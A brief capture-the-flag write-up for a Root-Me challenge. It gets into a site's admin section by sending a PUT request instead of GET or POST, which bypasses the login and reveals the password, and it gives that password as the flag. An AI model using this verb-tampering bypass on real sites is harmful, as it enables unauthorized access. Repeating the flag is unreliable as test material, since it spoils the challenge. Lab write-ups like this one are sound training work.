## It happens, sometimes

### Task

Access the administration section of the website and get password.

### Solution

1. Find administration section of site just by adding `/admin` to root url: `http://challenge01.root-me.org/realiste/ch3/admin/`
2. Don't try to find login/password on site.
3. Make any type of reques except typical **GET** and **POST** request, for example **PUT**:

```html
$ curl -X PUT http://challenge01.root-me.org/realiste/ch3/admin/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
    <title>Admin section</title>
</head>
<body>
    <h1>Mot de passe / password : 0010110111101001</h1>
</body>
</html>
```

### Answer

Password is `0010110111101001`
